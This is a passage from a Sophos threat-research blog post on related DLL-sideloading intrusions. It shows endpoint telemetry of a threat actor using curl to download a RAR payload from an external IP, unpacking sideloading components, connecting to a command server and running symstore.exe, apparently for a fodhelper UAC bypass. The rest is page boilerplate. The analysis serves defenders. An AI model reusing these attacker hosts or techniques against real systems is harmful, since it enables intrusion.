2022-06-24T04:05:44.571488Z      [ c:\users\public\libraries\3.exe::42928 ] 
      === FileDelete ===&gt;    [ c:\programdata\googleupdate\libvlc.dll ]
2022-06-24T04:05:44.573479Z      [ c:\users\public\libraries\3.exe::42928 ]
      === FileDelete ===&gt;    [ c:\programdata\googleupdate\loader.ja ]
2022-06-24T04:05:44.574480Z      [ c:\users\public\libraries\3.exe::42928 ] 
      === FileDelete ===&gt;    [ c:\programdata\googleupdate\nvsmartmax.dat ]
2022-06-24T04:05:44.576644Z      [ c:\users\public\libraries\3.exe::42928 ] 
      === FileDelete ===&gt;    [ c:\programdata\googleupdate\nvsmartmax.dll ]
2022-06-24T04:05:44.577473Z      [ c:\users\public\libraries\3.exe::42928 ] 
      === FileDelete ===&gt;    [ c:\programdata\googleupdate\time.sig ]
2022-06-24T04:05:44.580460Z      [ c:\users\public\libraries\3.exe::42928 ] 
      === RegKeySetValue ===&gt;       [ 
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings\S-
1-5-21-1497078658-3044148255-4064547459-1001 ]</pre>
<p>Downloading the components of the third sideloading scenario:</p>
<pre>2022-06-24T04:08:34.208478Z      [ 
c:\users\public\libraries\ciscocollabhost.exe::38752 ]    === FileRead ===&gt;
     [ c:\windows\syswow64\cmd.exe ]
2022-06-24T04:08:34.348517Z      [ c:\windows\syswow64\cmd.exe::38472 ]
     === FileRead ===&gt;       [ c:\windows\syswow64\curl.exe ]
2022-06-24T04:08:34.732663Z      [ c:\windows\syswow64\<strong>curl.exe</strong>::41216 ]
    === IpConnector ===&gt;   [ 5.252.178.162 ]
2022-06-24T04:08:35.412783Z      [ c:\windows\syswow64\curl.exe::41216 ]
    === FileWrite ===&gt;       [ c:\users\public\libraries\out\c.rar ]</pre>
<p>Unpacking the files from the downloaded RAR archive:</p>
<pre>2022-06-24T04:10:14.279520Z      [ c:\program files\winrar\rar.exe::40260 ]
     === FileWrite ===&gt;    [ c:\users\public\libraries\out\goopdate.ja ]
2022-06-24T04:10:14.299137Z      [ c:\program files\winrar\rar.exe::40260 ]
     === FileWrite ===&gt;    [ c:\users\public\libraries\out\<strong>libvlc.dll</strong> ]
2022-06-24T04:10:14.301128Z      [ c:\program files\winrar\rar.exe::40260 ]
     === FileWrite ===&gt;    [ c:\users\public\libraries\out\<strong>loader.ja</strong> ]
2022-06-24T04:10:14.307180Z      [ c:\program files\winrar\rar.exe::40260 ]
     === FileWrite ===&gt;    [ c:\users\public\libraries\out\time.sig ]
2022-06-24T04:10:14.310114Z      [ c:\program files\winrar\rar.exe::40260 ]
     === FileWrite ===&gt;    [ c:\users\public\libraries\out\googleupdate.exe ]
2022-06-24T04:10:14.322856Z      [ c:\program files\winrar\rar.exe::40260 ]
     === FileWrite ===&gt;    [ c:\users\public\libraries\out\googleupdate.exe ]
2022-06-24T04:10:14.322856Z      [ c:\program files\winrar\rar.exe::40260 ]
     === FileRead ===&gt;    [ c:\users\public\libraries\out\c.rar ]</pre>
<p>Execution of the third sideloading scenario:</p>
<pre>2022-06-24T04:11:16.921480Z      [ 
c:\users\public\libraries\out\googleupdate.exe::41944 ]   === FileRead ===&gt;
     [ c:\users\public\libraries\out\libvlc.dll ]
2022-06-24T04:11:16.962673Z      [ 
c:\users\public\libraries\out\googleupdate.exe::41944 ]   === FileRead ===&gt;
     [ c:\users\public\libraries\out\loader.ja ]</pre>
<p>Connecting to the server:</p>
<pre>2022-06-24T04:18:11.335261Z      [ 
c:\users\public\libraries\ciscocollabhost.exe::38752 ]    === IpConnector ===&gt;
     [ 91.245.253[.]52 ]</pre>
<p>The threat actor executed symstore.exe, with a few different command line arguments:</p>
<pre>         "commandLine" : 
"C:\\Users\\Public\\Libraries\\out\\symstore.exe  
C:\\Users\\Public\\Libraries\\out\\googleupdate.exe",
         "commandLine" : 
"C:\\Users\\Public\\Libraries\\out\\symstore.exe  
C:\\users\\public\\libraries\\3.exe",
         "commandLine" : 
"C:\\Users\\Public\\Libraries\\out\\symstore.exe  \"mkdir 
C:\\programdata\\googleupdate\"",</pre>
<p>It is likely that the sideloaded DLL component (symsrv.dll) takes these command-line parameters and executes using the fodhelper.exe UAC bypass trick.</p>
<p>IOCs for these attacks will be available on our <a href="https://github.com/sophoslabs/IoCs">GitHub repository</a>.</p>
			</div>
	<div class="mt-12">
		
<ul
	id="social-sharing"
	class="flex justify-center items-center space-x-6"
>
	<li class="facebook">
		<a
			class="js-share-modal"
			href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=87792&#038;title=Family%20Tree:%20DLL-Sideloading%20Cases%20May%20Be%20Related"
			data-title="Family Tree: DLL-Sideloading Cases May Be Related"
			title="Share on Facebook">
				<span class="sr-only">Share on Facebook</span>
				<svg
					width="8"
					height="16"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M7.145 8.006H4.903V16H1.581V8.006H0V5.182h1.581V3.354C1.581 2.045 2.202 0 4.933 0l2.461.01v2.742H5.608c-.291 0-.705.145-.705.77v1.66h2.533l-.291 2.824z" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="twitter">
		<a
			class="js-share-modal"
			href="http://twitter.com/intent/tweet?text=Family%20Tree%3A%20DLL-Sideloading%20Cases%20May%20Be%20Related%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D87792"
			data-title=""
			title="Share on X">
				<span class="sr-only">Share on X</span>
				<svg
					xmlns="http://www.w3.org/2000/svg"
					width="16"
					height="16"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M12.163 1.5h2.206L9.55 7.006l5.669 7.494H10.78L7.303 9.956 3.328 14.5h-2.21l5.154-5.89L.838 1.5h4.55l3.14 4.153zm-.776 11.681h1.222L4.722 2.75H3.409z"/>
				</svg>
		</a>
	</li>
	<li class="linkedin">
		<a
			href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/"
			data-title="Family Tree: DLL-Sideloading Cases May Be Related"
			title="Share on LinkedIn"
			onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;">
			<span class="sr-only">Share on LinkedIn</span>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M16 15.293h-3.43v-5.52c0-1.386-.496-2.334-1.738-2.334-.946 0-1.512.64-1.76 1.256-.09.22-.113.526-.113.836v5.762H5.53s.044-9.35 0-10.316h3.43v1.46c.456-.705 1.27-1.703 3.091-1.703 2.256 0 3.95 1.473 3.95 4.643v5.916zM1.917 3.566h-.022C.745 3.566 0 2.773 0 1.783 0 .772.768 0 1.94 0c1.173 0 1.896.772 1.917 1.783 0 .99-.744 1.783-1.94 1.783zM.202 15.293h3.431V4.977H.203v10.316z" fill-rule="nonzero"/>
			</svg>
		</a>
	</li>
	<li class="comments">
		<a
			href="#comments"
			title="Leave a Reply"
			class="flex items-center space-x-1"
		>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M8.5 0a7.5 7.5 0 11-3.916 13.898C3.317 15.273 1.773 15.36.256 15.135c1.011-1.185 1.678-2.357 2-3.517l-.007.027A7.5 7.5 0 018.5 0z" fill-rule="evenodd"/>
			</svg>
					</a>
	</li>
</ul>

			</div><!-- .entry-social -->
	</div>

</article><!-- #post-## -->

			<div class="container my-8 md:my-16">
				<div class="max-w-4xl mx-auto">
					<div class="article-author-block article-co-authors-block">
	
					<div class="author-block">
				<div class="author-block__profile">
					<img width="400" height="400" src="https://news.sophos.com/wp-content/uploads/2020/01/gabor-szappanos-threat-research-director-sophosLabs.jpeg?w=400" class="avatar avatar-400 photo wp-post-image" alt="" />				</div> <!-- .author-profile -->

				<div class="author-block__wrapper">
					<div class="author-block__content">

													<div class="author-block__about">
								About the Author							</div>
						
						<h3 class="author-block__name">
						<a href="https://news.sophos.com/en-us/author/gabor-szappanos/" title="Posts by Gabor Szappanos" class="author url fn" rel="author">Gabor Szappanos</a>						</h3>

						
							<div class="author-block__bio">
								<p>Gabor graduated from the Eotvos Lorand University of Budapest with a degree in physics. His first job was in the Computer and Automation Research Institute, developing diagnostic software and hardware for nuclear power plants. He started antivirus work in 1995, and began developing freeware antivirus solutions in his spare time. Gabor joined VirusBuster in 2001 where he was responsible for taking care of macro virus and script malware and became head of the virus lab in 2002. In 2008 he became a member of the Board of Directors in AMTSO (Anti Malware Testing Standards Organization) and, in 2012, joined Sophos as a Principal Malware Researcher.</p>
							</div> <!-- .author-bio -->

					</div>
				</div>

			</div> <!-- .author-block-container -->
		
		</div>
				</div>
			</div>

			
<div class="pb-24 bg-white">
<div class="container">
<div class="max-w-5xl mx-auto">

			
			<h3 class="text-style-h2 md:my-8 my-4">
				Read Similar Articles			</h3>

			<div class="article-grid article-grid--3-column">
				<!-- Article -->
<article
	id="post-75410"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75410 post type-post status-publish format-standard has-post-thumbnail hentry category-security-operations tag-encryption tag-mtr tag-ransomware tag-security tag-sidebar tag-sophos-rapid-response region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-ransomware-web-banner-1200x628px-option-2.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 24, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/24/what-to-expect-when-youve-been-hit-with-avaddon-ransomware/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">What to expect when you’ve been hit with Avaddon ransomware</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-75301"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75301 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-intercept-x tag-sidebar tag-sophos-edr tag-sophos-xdr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-edr-news-blog-image-838x440px@2x.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 19, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/19/whats-new-in-sophos-edr-4-0/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">What&#8217;s New in Sophos EDR 4.0</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
<!-- Article -->
<article
	id="post-75396"
	class="hover:shadow-lg dark:bg-sophos-gray-900 border-sophos-gray-200 flex flex-col overflow-hidden text-gray-700 transition-all bg-white border rounded-md shadow-md post-75396 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-sidebar tag-sophos-xdr tag-xdr region-en-us">
	<!-- Image -->
	<a
		class="aspect-w-16 aspect-h-9 flex block bg-gray-400 bg-right bg-no-repeat bg-cover"
		href="https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/"
		rel="bookmark"
		style="
			background-image: url('https://news.sophos.com/wp-content/uploads/2021/05/sophos-xdr.png?w=640');
		"
	></a>

	<!-- Wrapper -->
	<div class="flex flex-col justify-between flex-grow">

		<!-- Content -->
		<div class="sm:px-8 sm:py-8 p-4 py-6">
			<!-- Date -->
			<div
				class="text-sophos-blue-600 font-sansMedium mb-2 text-xs leading-tight uppercase truncate"
			>
				May 19, 2021			</div>
			<!-- Post Title -->
				<h2 class="text-style-h2 line-clamp-3 sm:mb-4 sm:text-2xl sm:leading-snug text-lg leading-tight text-gray-700"><a href="https://news.sophos.com/en-us/2021/05/19/sophos-xdr-driven-by-data/" rel="bookmark" class="dark:text-white font-sansSemiBold font-semibold text-gray-900 no-underline cursor-pointer">Sophos XDR: Driven by data</a></h2>			<!-- Excerpt -->
						</div>

			</div>
</article>
			</div>

	
</div>
</div>
</div> <!-- #secondary -->

			
		
		</main><!-- #main -->
	</div><!-- #primary -->


	</div> <!-- #content -->

	

	<div class="bg-sophos-gray-50 md:py-16 px-4 pb-4 pt-8">
		<div class="container max-w-2xl" x-show="!subscribed">
			<div class="text-style-h2-lg">
				Subscribe to get the latest updates in your inbox.			</div>
			<div id="mc_embed_shell">
				<link href="//cdn-images.mailchimp.com/embedcode/classic-061523.css" rel="stylesheet" type="text/css">
				<style type="text/css">
					
					/* Add your own Mailchimp form style overrides in your site stylesheet or in this style block.
					We recommend moving this block and the preceding CSS link to the HEAD of your HTML file. */
					#mc_embed_signup form, #mc_embed_signup #mc-embedded-subscribe-form div.mce_inline_error { margin:0; background: transparent; }
					#mc_embed_signup input { border-color: rgba(240, 242, 244, var(--tw-border-opacity)); }
					#mc_embed_signup input#mc-embedded-subscribe { border-radius: 9999px; }
					#mc-embedded-subscribe { margin-left:0; }
					#mc_embed_signup .mc-field-group.input-group input { height:1rem; width:1rem; }
					#mc_embed_signup #mc-embedded-subscribe-form input.mce_inline_error { border-color: rgba( 209, 213, 219, var( --tw-border-opacity ) );}
					#mc_embed_signup #mce-success-response { display: block;  color: #fff; font-weight: normal;  padding: .75rem 1rem; margin: 0; }
					#mc_embed_signup div#mce-responses { padding: 0; width: 100%; margin: .5rem 0; }
					#mc_embed_signup div.response { width:100%; padding: .75rem 1rem; font-weight: normal; }
				</style>
    
				<div id="mc_embed_signup">
					<form action="https://sophos.us2.list-manage.com/subscribe/post?u=2a2849a8c809119f4bd4929cc&amp;id=8d6471d831&amp;f_id=007062e1f0" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank">
						<div id="mc_embed_signup_scroll">
							<div class="mc-field-group">
								<input type="email" name="EMAIL" class="required email" id="mce-EMAIL" required="" value="" placeholder="name@email.com">
								<div id="mce-responses" class="clear flex flex-col my-6">
									<div class="response font-sansMedium px-4 py-3 mt-2 text-sm font-medium text-white bg-black border rounded-md" id="mce-error-response" style="display: none;"></div>
									<div class="response font-sansMedium px-4 py-3 mt-2 text-sm font-medium text-white bg-black border rounded-md" id="mce-success-response" style="display: none;"></div>
								</div>
							</div>
							
							<div class="mc-field-group input-group mb-4 text-lg">
								Which categories are you interested in?
								<ul>
									<li><input type="checkbox" name="group[3][1]" id="mce-group[3]-3-0" value=""><label for="mce-group[3]-3-0" class="text-style-form-label ml-2">Products and Services</label></li>
									<li><input type="checkbox" name="group[3][2]" id="mce-group[3]-3-1" value=""><label for="mce-group[3]-3-1" class="text-style-form-label ml-2">Threat Research</label></li>
									<li><input type="checkbox" name="group[3][4]" id="mce-group[3]-3-2" value=""><label for="mce-group[3]-3-2" class="text-style-form-label ml-2">Security Operations</label></li>
									<li><input type="checkbox" name="group[3][8]" id="mce-group[3]-3-3" value=""><label for="mce-group[3]-3-3" class="text-style-form-label ml-2">AI Research</label></li>
									<li><input type="checkbox" name="group[3][16]" id="mce-group[3]-3-4" value=""><label for="mce-group[3]-3-4" class="text-style-form-label ml-2">#SophosLife</label></li>
								</ul>
							</div>
							
							<div aria-hidden="true" style="position: absolute; left: -5000px;">
								<input type="text" name="b_2a2849a8c809119f4bd4929cc_8d6471d831" tabindex="-1" value="">
							</div>
							<div class="clear">
								<input type="submit" name="subscribe" id="mc-embedded-subscribe" class="round-button round-button--primary" value="Subscribe">
							</div>
						</div>
					</form>
				</div>
			</div>

		</div>
	</div>


	<footer
		class="bg-white border-t border-sophos-gray-200 "
		x-data="{ languageMenu: false, privacyMenu: false, legalMenu: false }"
	>
		<div class="container">
			<div class="md:flex-row md:items-center flex flex-col justify-between py-8">
				<div class="flex items-baseline flex-grow space-x-6">
					<!-- Language -->
					
<div class="relative mr-auto">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="languageMenu = !languageMenu"
		@click.away="languageMenu = false"
	>
		Change Region		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': languageMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>

	<!-- Language Menu -->
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="languageMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
											<li>
					<a href="https://news.sophos.com/es-419">
						América Latina					</a>
				</li>
															<li>
					<a href="https://news.sophos.com/pt-br">
						Brasil					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/de-de">
						Deutschland					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/en-us">
						English					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/fr-fr">
						France					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/es-es">
						Iberia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/it-it">
						Italia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/ja-jp">
						Japan					</a>
				</li>
									</ul>
	</div>
</div>

					<!-- Terms -->
					<a
						href="https://www.sophos.com/en-us/legal/sophos-website.aspx"
						class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block ml-auto text-xs font-medium leading-tight"
						>Terms</a
					>

					<!-- Privacy -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="privacyMenu = !privacyMenu"
		@click.away="privacyMenu = false"
	>
		Privacy
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': privacyMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="privacyMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx"
				>
					Privacy Notice				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/cookie-information.aspx"
				>
					Cookies				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Legal -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="legalMenu = !legalMenu"
		@click.away="legalMenu = false"
	>
		Legal
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': legalMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="legalMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal.aspx"
				>
					General				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx"
				>
					Modern Slavery Statement				</a>
			</li>
			<li>
				<a
					href="https://secure.ethicspoint.eu/domain/media/en/gui/104916/index.html"
				>
					Speak Out				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Copyright -->
					<div class="md:ml-6 mt-2 md:mt-0">
						<span
							class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
						>
							&copy; 1997 - 2024 Sophos Ltd. All rights reserved						</span>
					</div>
				</div>
			</div>
			</div>
		</div>
	</footer>
			<div id="amp-mobile-version-switcher" hidden>
			<a rel="" href="https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/?amp=1">
				Go to mobile version			</a>
		</div>

				<script type="text/javascript" id="sophos-js-core-js-extra">
/* <![CDATA[ */
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
/* ]]> */
</script>
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJyVjFEOwiAQBS8ku0Ka1H4Yz0LIpgVlIexqPb6YXqAk72sy83CvJhRWYkXdKJOglLoVYdrFuKudMUlfl8ozkvk4cGA7gANAkgue+gilDdj01eblvH8geGt8jVfB5+rjysNh9U2Z2nC3+uHkz3r0yHc7O7dM9rZM6Qegq6BH" ></script><script type="text/javascript" src="https://unpkg.com/alpinejs@2.8.1/dist/alpine.js?ver=2.0.3" id="alpine-js-js"></script>
<script type="text/javascript" src="https://news.sophos.com/wp-content/themes/sophosnews-2017/js/sophos-mc-validate.js?m=1730121999g" ></script><script type="text/javascript" src="https://stats.wp.com/e-202451.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"166161023\",\"post\":\"87792\",\"tz\":\"-5\",\"srv\":\"news.sophos.com\",\"hp\":\"vip\",\"j\":\"1:14.0\"}") ]);
_stq.push([ "clickTrackerInit", "166161023", "87792" ]);
/* ]]> */
</script>
</body>
</html>
